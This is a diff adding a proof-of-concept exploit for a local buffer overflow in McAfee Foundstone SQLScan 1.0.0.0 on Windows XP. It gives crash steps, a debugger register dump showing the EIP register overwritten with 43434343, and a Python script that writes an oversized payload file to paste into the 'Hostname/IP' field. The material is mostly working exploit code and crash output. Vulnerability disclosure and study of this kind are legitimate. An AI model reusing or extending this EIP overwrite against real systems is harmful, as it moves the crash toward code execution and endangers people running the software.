@@ -1,0 +1,55 @@
+# Exploit Title: McAfee Foundstone SQLScan - Denial of Service (PoC) and EIP record overwrite
+# Discovery by: Rafael Pedrero
+# Discovery Date: 2018-12-20
+# Vendor Homepage: http://www.mcafee.com/us/downloads/free-tools/sqlscan.aspx
+# Software Link : http://www.mcafee.com/us/downloads/free-tools/sqlscan.aspx
+# Tested Version: 1.0.0.0
+# Tested on: Windows XP SP3
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+
+# Steps to Produce the Crash:
+# 1.- Run SQLScan
+# 2.- copy content SQLScan_Crash.txt to clipboard (result from this python script)
+# 3.- Paste the content into the field: 'Hostname/IP'
+# 4.- Click '->' button and you will see a crash.
+
+
+'''
+EAX 00000001
+ECX 0012F8CC
+EDX 7C91E4F4 ntdll.KiFastSystemCallRet
+EBX 00000000
+ESP 0012FA80
+EBP 42424242
+ESI 00402FEB SQLScan.00402FEB
+EDI 0012FAD0
+EIP 43434343
+C 0  ES 0023 32bit 0(FFFFFFFF)
+P 1  CS 001B 32bit 0(FFFFFFFF)
+A 1  SS 0023 32bit 0(FFFFFFFF)
+Z 0  DS 0023 32bit 0(FFFFFFFF)
+S 1  FS 003B 32bit 7FFDF000(FFF)
+T 0  GS 0000 NULL
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010296 (NO,NB,NE,A,S,PE,L,LE)
+ST0 empty
+ST1 empty
+ST2 empty
+ST3 empty
+ST4 empty
+ST5 empty
+ST6 empty
+ST7 empty
+               3 2 1 0      E S P U O Z D I
+FST 4000  Cond 1 0 0 0  Err 0 0 0 0 0 0 0 0  (EQ)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+'''
+
+#!/usr/bin/env python
+
+junk = "\x41" * 384
+crash = junk + "BBBB" + "CCCC"
+f = open ("SQLScan_Crash.txt", "w")
+f.write(crash)
+f.close()
